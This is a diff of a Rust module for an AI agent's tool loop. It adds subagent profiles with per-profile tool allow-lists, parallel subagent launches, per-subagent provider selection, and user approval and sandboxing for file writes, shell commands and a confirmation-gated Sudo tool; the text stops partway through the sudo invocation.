@@ -1,5 +1,5 @@
 use std::{
-    fs, io,
+    fs,
     path::{Component, Path, PathBuf},
     process::Stdio,
     sync::Arc,
@@ -7,6 +7,7 @@ use std::{
 };
 
 use anyhow::{Context, anyhow, bail};
+use futures_util::future::join_all;
 use regex::Regex;
 use serde_json::{Map, Value, json};
 use tokio::{
@@ -15,6 +16,7 @@ use tokio::{
     sync::{RwLock, oneshot},
     time::{sleep, timeout},
 };
+use tokio_util::sync::CancellationToken;
 use tracing::{info, warn};
 use uuid::Uuid;
 
@@ -24,13 +26,20 @@ use crate::{
     firecrawl::{firecrawl_fetch, firecrawl_search},
     llama::LlamaClient,
     memory::append_memory_block,
+    privilege::{
+        clear_keyring_secret, command_requests_privilege, keyring_available, lookup_keyring_secret,
+        store_keyring_secret, validate_sudo,
+    },
+    provider_catalog::{AuthKind, WireProtocol, preset},
     questions::PendingQuestions,
     runtime::RuntimeHandles,
     runtime_profile::{RuntimeProfile, build_runtime_aware_system_prompt},
+    sandbox::{SandboxMode, SandboxPolicy, sandboxed_command, spawn_sandboxed_with_cancel},
     skills,
     storage::AppPaths,
     tasks,
     vision::SYSTEM_PROMPT,
+    web_approvals::PendingApprovals,
 };
 
 #[derive(Debug, Clone, Copy)]
@@ -52,23 +61,78 @@ pub async fn run_tool_loop(
     user_prompt: &str,
     session_key: Option<&str>,
     pending_questions: &PendingQuestions,
+    pending_approvals: &PendingApprovals,
     runtime: &RuntimeHandles,
     config_state: Option<Arc<RwLock<AppConfig>>>,
     agent_depth: u32,
+    local_web: bool,
+) -> String {
+    run_tool_loop_internal(
+        client,
+        cfg,
+        paths,
+        model,
+        system_prompt,
+        runtime_profile,
+        memory_block,
+        user_prompt,
+        session_key,
+        pending_questions,
+        pending_approvals,
+        runtime,
+        config_state,
+        agent_depth,
+        local_web,
+        None,
+        AgentProfile::Root,
+    )
+    .await
+}
+
+async fn run_tool_loop_internal(
+    client: &LlamaClient,
+    cfg: &AppConfig,
+    paths: &AppPaths,
+    model: &str,
+    system_prompt: &str,
+    runtime_profile: &RuntimeProfile,
+    memory_block: Option<&str>,
+    user_prompt: &str,
+    session_key: Option<&str>,
+    pending_questions: &PendingQuestions,
+    pending_approvals: &PendingApprovals,
+    runtime: &RuntimeHandles,
+    config_state: Option<Arc<RwLock<AppConfig>>>,
+    agent_depth: u32,
+    local_web: bool,
+    agent_id: Option<&str>,
+    agent_profile: AgentProfile,
 ) -> String {
     let runtime_aware_system_prompt = append_memory_block(
         &build_runtime_aware_system_prompt(system_prompt, runtime_profile),
         memory_block,
     );
     let runtime_aware_system_prompt = format!(
-        "{runtime_aware_system_prompt}\n\nWhen a tool is needed, call it through the native tool-calling API. Never print a tool call as markdown such as `**WebSearch** (query: ...)`. After receiving tool results, answer the user directly instead of announcing another intermediate step."
+        "{runtime_aware_system_prompt}\n\nSelected workspace: {}\nShared WebTool/WhatsApp execution mode: {}.\n{}\nWhen a tool is needed, call it through the native tool-calling API. Never print a tool call as markdown such as `**WebSearch** (query: ...)`. After receiving tool results, answer the user directly instead of announcing another intermediate step.",
+        paths.workspace_dir.display(),
+        cfg.web_sandbox_mode,
+        agent_profile.guidance(),
     );
     let mut messages = vec![
         json!({"role": "system", "content": runtime_aware_system_prompt}),
         json!({"role": "user", "content": user_prompt}),
     ];
     let max_steps = cfg.tool_loop_max_steps.max(1);
-    let schemas = openai_tool_schemas();
+    let schemas = openai_tool_schemas()
+        .into_iter()
+        .filter(|schema| {
+            schema
+                .get("function")
+                .and_then(|function| function.get("name"))
+                .and_then(Value::as_str)
+                .is_some_and(|name| agent_profile.allows(name))
+        })
+        .collect::<Vec<_>>();
     let mut final_content = String::new();
     let mut structured_output_only = false;
     let mut tool_observations = Vec::new();
@@ -79,6 +143,8 @@ pub async fn run_tool_loop(
             .filter(|item| !item.is_empty())
             .unwrap_or_else(|| "default".into()),
         agent_depth,
+        agent_id: agent_id.map(str::to_string),
+        agent_profile,
         memory_block: memory_block
             .map(str::trim)
             .filter(|item| !item.is_empty())
@@ -130,38 +196,85 @@ pub async fn run_tool_loop(
             "tool_calls": normalized_calls,
         }));
 
-        let mut structured_output = None;
-        for tool_call in &normalized_calls {
-            let function = tool_call.get("function").and_then(Value::as_object);
-            let name = function
-                .and_then(|item| item.get("name"))
-                .and_then(Value::as_str)
-                .unwrap_or("");
-            let args = function
-                .and_then(|item| item.get("arguments"))
-                .and_then(Value::as_str)
-                .and_then(|raw| serde_json::from_str::<Value>(raw).ok())
-                .and_then(|value| value.as_object().cloned())
-                .unwrap_or_default();
+        let parsed_calls = normalized_calls
+            .iter()
+            .map(|tool_call| {
+                let function = tool_call.get("function").and_then(Value::as_object);
+                let name = function
+                    .and_then(|item| item.get("name"))
+                    .and_then(Value::as_str)
+                    .unwrap_or("")
+                    .to_string();
+                let args = function
+                    .and_then(|item| item.get("arguments"))
+                    .and_then(Value::as_str)
+                    .and_then(|raw| serde_json::from_str::<Value>(raw).ok())
+                    .and_then(|value| value.as_object().cloned())
+                    .unwrap_or_default();
+                let call_id = tool_call
+                    .get("id")
+                    .and_then(Value::as_str)
+                    .unwrap_or("call")
+                    .to_string();
+                (name, args, call_id)
+            })
+            .collect::<Vec<_>>();
 
-            let output = match execute_tool_call(
-                name,
-                &args,
-                cfg,
-                paths,
-                client,
-                model,
-                &tool_ctx,
-                runtime_profile,
-                pending_questions,
-                runtime,
-                config_state.clone(),
-            )
+        // Claude Code-style fan-out: independent Agent calls emitted in one
+        // assistant response are polled together. Other tool batches stay
+        // ordered because writes and shell commands can depend on each other.
+        let parallel_agent_batch =
+            parsed_calls.len() > 1 && parsed_calls.iter().all(|(name, _, _)| name == "Agent");
+        let executions = if parallel_agent_batch {
+            join_all(parsed_calls.iter().map(|(name, args, _)| {
+                execute_tool_call(
+                    name,
+                    args,
+                    cfg,
+                    paths,
+                    client,
+                    model,
+                    &tool_ctx,
+                    runtime_profile,
+                    pending_questions,
+                    pending_approvals,
+                    runtime,
+                    config_state.clone(),
+                    local_web,
+                )
+            }))
             .await
-            {
+        } else {
+            let mut results = Vec::with_capacity(parsed_calls.len());
+            for (name, args, _) in &parsed_calls {
+                results.push(
+                    execute_tool_call(
+                        name,
+                        args,
+                        cfg,
+                        paths,
+                        client,
+                        model,
+                        &tool_ctx,
+                        runtime_profile,
+                        pending_questions,
+                        pending_approvals,
+                        runtime,
+                        config_state.clone(),
+                        local_web,
+                    )
+                    .await,
+                );
+            }
+            results
+        };
+
+        let mut structured_output = None;
+        for ((name, args, call_id), execution) in parsed_calls.iter().zip(executions) {
+            let output = match execution {
                 Ok(result) => {
                     let observation =
-                        ToolObservation::from_success(runtime_profile, name, &args, &result);
+                        ToolObservation::from_success(runtime_profile, name, args, &result);
                     let source_attribution = observation.source_attribution.as_json();
                     let observation_json = observation.as_json_for_model();
                     tool_observations.push(observation);
@@ -185,7 +298,7 @@ pub async fn run_tool_loop(
                 }
                 Err(err) => {
                     let observation =
-                        ToolObservation::from_error(runtime_profile, name, &args, &err.to_string());
+                        ToolObservation::from_error(runtime_profile, name, args, &err.to_string());
                     let source_attribution = observation.source_attribution.as_json();
                     let observation_json = observation.as_json_for_model();
                     tool_observations.push(observation);
@@ -201,7 +314,7 @@ pub async fn run_tool_loop(
 
             messages.push(json!({
                 "role": "tool",
-                "tool_call_id": tool_call.get("id").and_then(Value::as_str).unwrap_or("call"),
+                "tool_call_id": call_id,
                 "content": output.to_string(),
             }));
         }
@@ -286,10 +399,95 @@ fn empty_response_fallback(tool_observations: &[ToolObservation]) -> Option<Stri
     }
 }
 
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum AgentProfile {
+    Root,
+    GeneralPurpose,
+    Explore,
+    Plan,
+}
+
+impl AgentProfile {
+    fn from_subagent_type(value: &str) -> Self {
+        match normalize_ws(value).to_ascii_lowercase().as_str() {
+            "explore" | "research" | "search" => Self::Explore,
+            "plan" | "planner" => Self::Plan,
+            _ => Self::GeneralPurpose,
+        }
+    }
+
+    fn label(self) -> &'static str {
+        match self {
+            Self::Root => "root",
+            Self::GeneralPurpose => "general-purpose",
+            Self::Explore => "Explore",
+            Self::Plan => "Plan",
+        }
+    }
+
+    fn allows(self, tool: &str) -> bool {
+        match self {
+            Self::Root => true,
+            Self::GeneralPurpose => !matches!(tool, "AskUserQuestion" | "Config"),
+            Self::Explore => matches!(
+                tool,
+                "ToolSearch"
+                    | "Read"
+                    | "Glob"
+                    | "Grep"
+                    | "Skill"
+                    | "StructuredOutput"
+                    | "TaskGet"
+                    | "TaskList"
+                    | "TaskOutput"
+                    | "WebSearch"
+                    | "WebFetch"
+            ),
+            Self::Plan => matches!(
+                tool,
+                "Agent"
+                    | "ToolSearch"
+                    | "Read"
+                    | "Glob"
+                    | "Grep"
+                    | "Skill"
+                    | "StructuredOutput"
+                    | "TodoWrite"
+                    | "TaskCreate"
+                    | "TaskGet"
+                    | "TaskList"
+                    | "TaskUpdate"
+                    | "TaskOutput"
+                    | "WebSearch"
+                    | "WebFetch"
+            ),
+        }
+    }
+
+    fn guidance(self) -> &'static str {
+        match self {
+            Self::Root => {
+                "For complex work, use the Agent tool proactively to delegate independent, well-scoped tasks. Give every subagent all context it needs because it receives a separate conversation. Launch multiple independent Agent calls in the same response so they can run concurrently. Use Explore for read-only codebase/web investigation, Plan for solution design without file changes, and general-purpose for implementation. Each Agent call may independently choose provider_id and model; use inherit unless the user requested a particular provider/model or a saved provider is clearly better suited. Do not delegate trivial work or duplicate work already in progress. Synchronous subagent results return directly; background agents are checked with TaskOutput."
+            }
+            Self::GeneralPurpose => {
+                "You are a general-purpose subagent with an isolated context. You may inspect and modify the shared workspace using the available tools. Do not ask the human questions; report blockers to the parent."
+            }
+            Self::Explore => {
+                "You are an Explore subagent with an isolated, read-only context. Search broadly, read concrete sources, and return file paths, symbols, and evidence. You cannot modify files or execute shell commands."
+            }
+            Self::Plan => {
+                "You are a Plan subagent with an isolated, read-only context. Investigate first, then return an actionable implementation plan with affected files, risks, and verification. You may delegate read-only exploration but cannot modify files or execute shell commands."
+            }
+        }
+    }
+}
+
 #[derive(Debug)]
 struct ToolContext {
     session_key: String,
     agent_depth: u32,
+    agent_id: Option<String>,
+    agent_profile: AgentProfile,
     memory_block: Option<String>,
 }
 
@@ -303,10 +501,18 @@ async fn execute_tool_call(
     tool_ctx: &ToolContext,
     runtime_profile: &RuntimeProfile,
     pending_questions: &PendingQuestions,
+    pending_approvals: &PendingApprovals,
     runtime: &RuntimeHandles,
     config_state: Option<Arc<RwLock<AppConfig>>>,
+    local_web: bool,
 ) -> anyhow::Result<Value> {
     info!("Tool call: {name} [scope={}]", tool_ctx.session_key);
+    if !tool_ctx.agent_profile.allows(name) {
+        bail!(
+            "Tool {name} is not available to the {} subagent profile",
+            tool_ctx.agent_profile.label()
+        );
+    }
     match name {
         "AskUserQuestion" => {
             tool_ask_user_question(pending_questions, &tool_ctx.session_key, args).await
@@ -321,18 +527,65 @@ async fn execute_tool_call(
                 tool_ctx,
                 runtime_profile,
                 pending_questions,
+                pending_approvals,
                 runtime,
                 config_state.clone(),
+                local_web,
             )
             .await
         }
-        "ToolSearch" => tool_search(args),
+        "ToolSearch" => tool_search(args, tool_ctx.agent_profile),
         "Read" => tool_read(paths, args).await,
-        "Write" => tool_write(paths, args).await,
-        "Edit" => tool_edit(paths, args).await,
+        "Write" => {
+            authorize_standard(
+                cfg,
+                pending_approvals,
+                &tool_ctx.session_key,
+                "Write",
+                &required_string(args, "path")?,
+                "The tool will create or overwrite a workspace file.",
+                paths,
+            )
+            .await?;
+            tool_write(paths, args).await
+        }
+        "Edit" => {
+            authorize_standard(
+                cfg,
+                pending_approvals,
+                &tool_ctx.session_key,
+                "Edit",
+                &required_string(args, "path")?,
+                "The tool will modify an existing workspace file.",
+                paths,
+            )
+            .await?;
+            tool_edit(paths, args).await
+        }
         "Glob" => tool_glob(paths, args),
         "Grep" => tool_grep(paths, args).await,
-        "Bash" => tool_bash(paths, args, runtime, &tool_ctx.session_key).await,
+        "Bash" => {
+            tool_bash(
+                cfg,
+                paths,
+                args,
+                runtime,
+                &tool_ctx.session_key,
+                pending_approvals,
+            )
+            .await
+        }
+        "Sudo" => {
+            tool_sudo(
+                cfg,
+                paths,
+                args,
+                &tool_ctx.session_key,
+                pending_approvals,
+                local_web,
+            )
+            .await
+        }
         "Config" => tool_config(cfg, paths, args, config_state).await,
         "Skill" => tool_skill(paths, args),
         "StructuredOutput" => Ok(json!({"structured_output": args})),
@@ -585,10 +838,13 @@ fn unwrap_textual_assistant_reply(content: &str) -> String {
         .unwrap_or_else(|| content.to_string())
 }
 
-fn tool_search(args: &Map<String, Value>) -> anyhow::Result<Value> {
+fn tool_search(args: &Map<String, Value>, profile: AgentProfile) -> anyhow::Result<Value> {
     let query = value_string(args, "query").unwrap_or_default();
     let max_results = value_u64(args, "max_results").unwrap_or(5).clamp(1, 20) as usize;
-    let metas = tool_metadata();
+    let metas = tool_metadata()
+        .into_iter()
+        .filter(|meta| profile.allows(meta.name))
+        .collect::<Vec<_>>();
     if query.trim().is_empty() {
         return Ok(json!({
             "matches": metas.iter().take(max_results).map(tool_meta_json).collect::<Vec<_>>(),
@@ -658,6 +914,65 @@ fn tool_search(args: &Map<String, Value>) -> anyhow::Result<Value> {
     }))
 }
 
+fn resolve_agent_provider(
+    parent_cfg: &AppConfig,
+    current_model: &str,
+    requested_provider: &str,
+    requested_model: Option<&str>,
+) -> anyhow::Result<(AppConfig, String, String)> {
+    let requested_provider = normalize_ws(requested_provider).to_ascii_lowercase();
+    let inherit = requested_provider.is_empty()
+        || matches!(
+            requested_provider.as_str(),
+            "inherit" | "current" | "parent"
+        );
+    let provider_id = if inherit {
+        parent_cfg.provider_id.clone()
+    } else {
+        requested_provider
+    };
+    let provider =
+        preset(&provider_id).ok_or_else(|| anyhow!("Unknown subagent provider: {provider_id}"))?;
+    if provider.auth == AuthKind::Account {
+        bail!(
+            "Subagents in WebTool/WhatsApp require an API provider; account-backed provider {} is terminal-only",
+            provider.name
+        );
+    }
+
+    let mut agent_cfg = parent_cfg.clone();
+    agent_cfg.provider_id = provider_id.clone();
+    agent_cfg.provider_protocol = match provider.protocol {
+        WireProtocol::Anthropic => "anthropic",
+        WireProtocol::OpenAi => "openai",
+        WireProtocol::CodexAppServer => "codex",
+        WireProtocol::ClaudeCli => "claude-cli",
+    }
+    .into();
+    if provider_id != "custom" || parent_cfg.provider_id != "custom" {
+        agent_cfg.llama_base_url = provider.base_url.to_string();
+    }
+    let model = requested_model
+        .map(normalize_ws)
+        .filter(|model| !model.is_empty())
+        .unwrap_or_else(|| {
+            if inherit || provider_id == parent_cfg.provider_id {
+                current_model.to_string()
+            } else {
+                provider.default_model.to_string()
+            }
+        });
+    agent_cfg.default_model = model.clone();
+    agent_cfg.normalize();
+    if provider.auth == AuthKind::ApiKey && agent_cfg.llama_api_key.trim().is_empty() {
+        bail!(
+            "Provider {} has no saved API key. Save its key once in WebTool settings before assigning a subagent to it",
+            provider.name
+        );
+    }
+    Ok((agent_cfg, provider_id, model))
+}
+
 async fn tool_agent(
     cfg: &AppConfig,
     paths: &AppPaths,
@@ -667,16 +982,30 @@ async fn tool_agent(
     tool_ctx: &ToolContext,
     runtime_profile: &RuntimeProfile,
     pending_questions: &PendingQuestions,
+    pending_approvals: &PendingApprovals,
     runtime: &RuntimeHandles,
     config_state: Option<Arc<RwLock<AppConfig>>>,
+    local_web: bool,
 ) -> anyhow::Result<Value> {
     let prompt = required_string(args, "prompt")?;
     let description = value_string(args, "description").unwrap_or_else(|| "Delegated task".into());
-    let subagent_type = value_string(args, "subagent_type").unwrap_or_default();
-    let agent_model = value_string(args, "model").unwrap_or_else(|| current_model.to_string());
+    let subagent_type = value_string(args, "subagent_type")
+        .filter(|value| !value.trim().is_empty())
+        .unwrap_or_else(|| "general-purpose".into());
+    let agent_profile = AgentProfile::from_subagent_type(&subagent_type);
+    let requested_provider = value_string(args, "provider_id").unwrap_or_else(|| "inherit".into());
+    let requested_model = value_string(args, "model")
+        .filter(|value| !value.trim().is_empty() && !value.eq_ignore_ascii_case("inherit"));
+    let (agent_cfg, agent_provider, agent_model) = resolve_agent_provider(
+        cfg,
+        current_model,
+        &requested_provider,
+        requested_model.as_deref(),
+    )?;
     let isolation = value_string(args, "isolation")
         .unwrap_or_else(|| "local".into())
         .to_lowercase();
+    let run_in_background = value_bool(args, "run_in_background").unwrap_or(false);
     let max_depth = cfg.agent_max_depth.max(1);
     if tool_ctx.agent_depth >= max_depth {
         bail!("Agent nesting limit reached ({max_depth})");
@@ -684,7 +1013,7 @@ async fn tool_agent(
 
     if isolation == "remote" {
         return launch_remote_agent(
-            cfg,
+            &agent_cfg,
             paths,
             runtime,
             &tool_ctx.session_key,
@@ -692,6 +1021,9 @@ async fn tool_agent(
             &description,
             &subagent_type,
             &agent_model,
+            tool_ctx.agent_id.as_deref(),
+            tool_ctx.agent_depth + 1,
+            &agent_provider,
         )
         .await;
     }
@@ -699,38 +1031,71 @@ async fn tool_agent(
         bail!("isolation must be local or remote");
     }
 
-    if value_bool(args, "run_in_background").unwrap_or(false) {
-        let task = tasks::create_runtime_task(
-            paths,
-            &tool_ctx.session_key,
-            "local_agent",
-            &description,
-            &description,
-            &prompt,
-            "running",
-            json!({
-                "agent_type": if subagent_type.is_empty() { "general-purpose" } else { subagent_type.as_str() },
-                "model": agent_model.as_str(),
-                "isolation": "local",
-            }),
-        )?;
-        let task_id = task
-            .get("id")
-            .and_then(Value::as_str)
-            .ok_or_else(|| anyhow!("runtime task was created without an id"))?
-            .to_string();
-        let output_file = task
-            .get("outputFile")
-            .and_then(Value::as_str)
-            .unwrap_or("")
-            .to_string();
-        let (cancel_tx, cancel_rx) = oneshot::channel();
-        runtime.register(task_id.clone(), cancel_tx).await;
+    let task = tasks::create_runtime_task(
+        paths,
+        &tool_ctx.session_key,
+        "local_agent",
+        &description,
+        &description,
+        &prompt,
+        "running",
+        json!({
+            "agent_type": agent_profile.label(),
+            "requested_agent_type": subagent_type.as_str(),
+            "provider_id": agent_provider.as_str(),
+            "model": agent_model.as_str(),
+            "isolation": "local",
+            "background": run_in_background,
+            "parent_agent_id": tool_ctx.agent_id,
+            "agent_depth": tool_ctx.agent_depth + 1,
+            "source": source_channel_for_scope(&tool_ctx.session_key),
+            "workspace": paths.workspace_dir.to_string_lossy(),
+        }),
+    )?;
+    let task_id = task
+        .get("id")
+        .and_then(Value::as_str)
+        .ok_or_else(|| anyhow!("runtime task was created without an id"))?
+        .to_string();
+    let output_file = task
+        .get("outputFile")
+        .and_then(Value::as_str)
+        .unwrap_or("")
+        .to_string();
+    let (cancel_tx, cancel_rx) = oneshot::channel();
+    if !runtime
+        .register_agent(
+            task_id.clone(),
+            cancel_tx,
+            agent_cfg.agent_max_concurrent.max(1) as usize,
+        )
+        .await
+    {
+        let message = format!(
+            "Concurrent subagent limit reached ({})",
+            agent_cfg.agent_max_concurrent.max(1)
+        );
+        let _ = tasks::mark_task_terminal(paths, &task_id, "failed", None, Some(&message));
+        bail!(message);
+    }
 
+    let _ = tasks::append_task_output_text(
+        paths,
+        &task_id,
+        &format!(
+            "[{}] {} subagent started: {}\n\n",
+            runtime_timestamp(),
+            agent_profile.label(),
+            description
+        ),
+    );
+
+    if run_in_background {
         let worker_paths = (*paths).clone();
-        let worker_cfg = cfg.clone();
+        let worker_cfg = agent_cfg.clone();
         let worker_client = client.clone();
         let worker_pending = pending_questions.clone();
+        let worker_approvals = pending_approvals.clone();
         let worker_runtime = runtime.clone();
         let worker_runtime_profile = runtime_profile.clone();
         let worker_config_state = config_state.clone();
@@ -739,6 +1104,7 @@ async fn tool_agent(
         let worker_prompt = prompt.clone();
         let worker_description = description.clone();
         let worker_subagent_type = subagent_type.clone();
+        let worker_agent_profile = agent_profile;
         let worker_model = agent_model.clone();
         let worker_depth = tool_ctx.agent_depth + 1;
         let worker_memory_block = tool_ctx.memory_block.clone();
@@ -754,6 +1120,7 @@ async fn tool_agent(
                     worker_cfg,
                     worker_client,
                     worker_pending,
+                    worker_approvals,
                     worker_runtime,
                     worker_runtime_profile,
                     worker_config_state,
@@ -763,9 +1130,11 @@ async fn tool_agent(
                     worker_model,
                     worker_description,
                     worker_subagent_type,
+                    worker_agent_profile,
                     worker_depth,
                     worker_memory_block,
                     cancel_rx,
+                    local_web,
                 )),
                 Err(err) => {
                     let message = format!("Failed to start local agent runtime: {err}");
@@ -791,41 +1160,127 @@ async fn tool_agent(
             "taskId": task_id.as_str(),
             "description": description,
             "prompt": prompt,
+            "subagentType": agent_profile.label(),
+            "providerId": agent_provider,
+            "parentAgentId": tool_ctx.agent_id,
             "outputFile": output_file,
         }));
     }
 
     let system_prompt = build_agent_system_prompt(&description, &subagent_type);
-    let result = Box::pin(run_tool_loop(
-        client,
-        cfg,
-        paths,
-        &agent_model,
-        &system_prompt,
-        runtime_profile,
-        tool_ctx.memory_block.as_deref(),
-        &prompt,
-        Some(&tool_ctx.session_key),
-        pending_questions,
-        runtime,
-        config_state.clone(),
-        tool_ctx.agent_depth + 1,
-    ))
-    .await;
+    let response = tokio::select! {
+        reply = Box::pin(run_tool_loop_internal(
+            client,
+            &agent_cfg,
+            paths,
+            &agent_model,
+            &system_prompt,
+            runtime_profile,
+            tool_ctx.memory_block.as_deref(),
+            &prompt,
+            Some(&tool_ctx.session_key),
+            pending_questions,
+            pending_approvals,
+            runtime,
+            config_state.clone(),
+            tool_ctx.agent_depth + 1,
+            local_web,
+            Some(&task_id),
+            agent_profile,
+        )) => Some(reply),
+        _ = cancel_rx => None,
+    };
+    runtime.remove(&task_id).await;
+    let Some(result) = response else {
+        let message = "Subagent stopped";
+        let _ = tasks::append_task_output_text(
+            paths,
+            &task_id,
+            &format!("[{}] {message}\n", runtime_timestamp()),
+        );
+        let _ = tasks::mark_task_terminal(paths, &task_id, "killed", None, Some(message));
+        return Ok(json!({
+            "status": "killed",
+            "agentId": task_id,
+            "taskId": task_id,
+            "description": description,
+        }));
+    };
+    let result = result.trim().to_string();
+    let _ = tasks::append_task_output_text(paths, &task_id, &(result.clone() + "\n"));
+    let _ = tasks::mark_task_terminal(paths, &task_id, "completed", Some(&result), None);
     Ok(json!({
         "status": "completed",
+        "agentId": task_id.as_str(),
+        "taskId": task_id.as_str(),
         "prompt": prompt,
         "description": description,
+        "subagentType": agent_profile.label(),
+        "providerId": agent_provider,
+        "parentAgentId": tool_ctx.agent_id,
+        "outputFile": output_file,
         "result": result,
     }))
 }
 
-async fn tool_read(paths: &AppPaths, args: &Map<String, Value>) -> anyhow::Result<Value> {
-    let path = resolve_workspace_path(
+/// Launch a user-configured background subagent from the shared WebTool
+/// registry. It deliberately goes through the same Agent implementation as a
+/// model-issued delegation, including provider credentials, sandbox policy,
+/// approvals, depth/concurrency limits, and durable task metadata.
+#[allow(clippy::too_many_arguments)]
+pub async fn launch_background_subagent(
+    client: &LlamaClient,
+    cfg: &AppConfig,
+    paths: &AppPaths,
+    current_model: &str,
+    runtime_profile: &RuntimeProfile,
+    pending_questions: &PendingQuestions,
+    pending_approvals: &PendingApprovals,
+    runtime: &RuntimeHandles,
+    config_state: Option<Arc<RwLock<AppConfig>>>,
+    local_web: bool,
+    scope_key: &str,
+    description: &str,
+    prompt: &str,
+    subagent_type: &str,
+    provider_id: &str,
+    model: Option<&str>,
+    memory_block: Option<String>,
+) -> anyhow::Result<Value> {
+    let mut args = Map::new();
+    args.insert("description".into(), json!(description));
+    args.insert("prompt".into(), json!(prompt));
+    args.insert("subagent_type".into(), json!(subagent_type));
+    args.insert("provider_id".into(), json!(provider_id));
+    args.insert("model".into(), json!(model.unwrap_or("inherit")));
+    args.insert("run_in_background".into(), json!(true));
+    args.insert("isolation".into(), json!("local"));
+    let tool_ctx = ToolContext {
+        session_key: normalize_ws(scope_key),
+        agent_depth: 0,
+        agent_id: None,
+        agent_profile: AgentProfile::Root,
+        memory_block,
+    };
+    tool_agent(
+        cfg,
         paths,
-        &required_string(args, "path")?,
-        value_bool(args, "allow_outside_workspace").unwrap_or(false),
-    )?;
+        client,
+        current_model,
+        &args,
+        &tool_ctx,
+        runtime_profile,
+        pending_questions,
+        pending_approvals,
+        runtime,
+        config_state,
+        local_web,
+    )
+    .await
+}
+
+async fn tool_read(paths: &AppPaths, args: &Map<String, Value>) -> anyhow::Result<Value> {
+    let path = resolve_workspace_path(paths, &required_string(args, "path")?, false)?;
     if !path.exists() {
         bail!("File not found: {}", path.display());
     }
@@ -949,14 +1404,69 @@ async fn tool_grep(paths: &AppPaths, args: &Map<String, Value>) -> anyhow::Resul
     }))
 }
 
+async fn authorize_standard(
+    cfg: &AppConfig,
+    pending_approvals: &PendingApprovals,
+    scope_key: &str,
+    tool: &str,
+    command: &str,
+    reason: &str,
+    paths: &AppPaths,
+) -> anyhow::Result<()> {
+    match web_sandbox_mode(cfg) {
+        SandboxMode::ReadOnly => bail!("{tool} is disabled in read-only mode"),
+        SandboxMode::FullAccess => Ok(()),
+        SandboxMode::Normal | SandboxMode::IsolatedWorkspaceWrite => {
+            let approved = pending_approvals
+                .request_standard(
+                    scope_key,
+                    tool,
+                    command,
+                    reason,
+                    &paths.workspace_dir.to_string_lossy(),
+                )
+                .await?;
+            if approved {
+                Ok(())
+            } else {
+                bail!("{tool} was denied by the user")
+            }
+        }
+    }
+}
+
+fn web_sandbox_mode(cfg: &AppConfig) -> SandboxMode {
+    match cfg.web_sandbox_mode.as_str() {
+        "read-only" => SandboxMode::ReadOnly,
+        "full-access" => SandboxMode::FullAccess,
+        _ => SandboxMode::Normal,
+    }
+}
+
+fn web_sandbox_policy(cfg: &AppConfig, cwd: PathBuf, timeout_seconds: u64) -> SandboxPolicy {
+    let mut policy = match web_sandbox_mode(cfg) {
+        SandboxMode::ReadOnly => SandboxPolicy::read_only(cwd),
+        SandboxMode::FullAccess => SandboxPolicy::full_access(cwd),
+        SandboxMode::Normal | SandboxMode::IsolatedWorkspaceWrite => SandboxPolicy::normal(cwd),
+    };
+    policy.timeout_ms = timeout_seconds.saturating_mul(1_000);
+    policy.max_output_bytes = 256 * 1024;
+    policy
+}
+
 async fn tool_bash(
+    cfg: &AppConfig,
     paths: &AppPaths,
     args: &Map<String, Value>,
     runtime: &RuntimeHandles,
     scope_key: &str,
+    pending_approvals: &PendingApprovals,
 ) -> anyhow::Result<Value> {
     let command = required_string(args, "command")?;
     validate_bash_command(&command)?;
+    if command_requests_privilege(&command) {
+        bail!("Bash cannot invoke sudo; use the dedicated Sudo tool")
+    }
     let cwd = resolve_workspace_path(
         paths,
         &value_string(args, "cwd").unwrap_or_else(|| ".".into()),
@@ -965,27 +1475,144 @@ async fn tool_bash(
     if !cwd.is_dir() {
         bail!("cwd is not a directory: {}", cwd.display());
     }
-    if value_bool(args, "run_in_background").unwrap_or(false) {
-        return launch_background_bash(paths, runtime, scope_key, command, cwd).await;
-    }
-    let secs = value_u64(args, "timeout").unwrap_or(20).clamp(1, 120);
-    let output = timeout(
-        Duration::from_secs(secs),
-        Command::new("bash")
-            .arg("-lc")
-            .arg(&command)
-            .current_dir(&cwd)
-            .output(),
+    authorize_standard(
+        cfg,
+        pending_approvals,
+        scope_key,
+        "Bash",
+        &command,
+        "The command runs with your normal OS account and may modify files or start processes.",
+        paths,
     )
-    .await
-    .context("bash command timed out")??;
+    .await?;
+    let secs = value_u64(args, "timeout").unwrap_or(20).clamp(1, 120);
+    let policy = web_sandbox_policy(cfg, cwd.clone(), secs);
+    if value_bool(args, "run_in_background").unwrap_or(false) {
+        return launch_background_bash(paths, runtime, scope_key, command, cwd, policy).await;
+    }
+    let output = spawn_sandboxed_with_cancel(
+        &policy,
+        "bash",
+        &["-lc".into(), command.clone()],
+        &CancellationToken::new(),
+    )
+    .await?;
     Ok(json!({
         "command": command,
         "cwd": cwd.to_string_lossy(),
-        "exit_code": output.status.code().unwrap_or(-1),
-        "stdout": tail(&String::from_utf8_lossy(&output.stdout), 12_000),
-        "stderr": tail(&String::from_utf8_lossy(&output.stderr), 12_000),
+        "exit_code": output.exit_code.unwrap_or(-1),
+        "stdout": tail(&output.stdout, 12_000),
+        "stderr": tail(&output.stderr, 12_000),
+        "timed_out": output.timed_out,
+        "truncated": output.truncated,
     }))
+}
+
+async fn tool_sudo(
+    cfg: &AppConfig,
+    paths: &AppPaths,
+    args: &Map<String, Value>,
+    scope_key: &str,
+    pending_approvals: &PendingApprovals,
+    local_web: bool,
+) -> anyhow::Result<Value> {
+    if !local_web {
+        bail!("Sudo is disabled when WebTool listens on a non-loopback address")
+    }
+    if web_sandbox_mode(cfg) == SandboxMode::ReadOnly {
+        bail!("Sudo is disabled in read-only mode")
+    }
+    let command = required_string(args, "command")?;
+    let cwd = resolve_workspace_path(
+        paths,
+        &value_string(args, "cwd").unwrap_or_else(|| ".".into()),
+        false,
+    )?;
+    if !cwd.is_dir() {
+        bail!("cwd is not a directory: {}", cwd.display());
+    }
+    let approved = pending_approvals
+        .request_standard(
+            scope_key,
+            "Sudo",
+            &command,
+            "This command will run as root. Full-access never bypasses this confirmation.",
+            &paths.workspace_dir.to_string_lossy(),
+        )
+        .await?;
+    if !approved {
+        bail!("Sudo was denied by the user")
+    }
+
+    let cancel = CancellationToken::new();
+    ensure_web_sudo_authenticated(pending_approvals, scope_key, &command, &cancel).await?;
+    let secs = value_u64(args, "timeout").unwrap_or(60).clamp(1, 600);
+    let mut policy = SandboxPolicy::full_access(cwd.clone());
+    policy.allow_privilege_escalation = true;
+    policy.timeout_ms = secs.saturating_mul(1_000);
+    policy.max_output_bytes = 256 * 1024;
+    let output = spawn_sandboxed_with_cancel(
+        &policy,
+        "sudo",
+        &[
+            "-n".into(),
+            "--".into(),
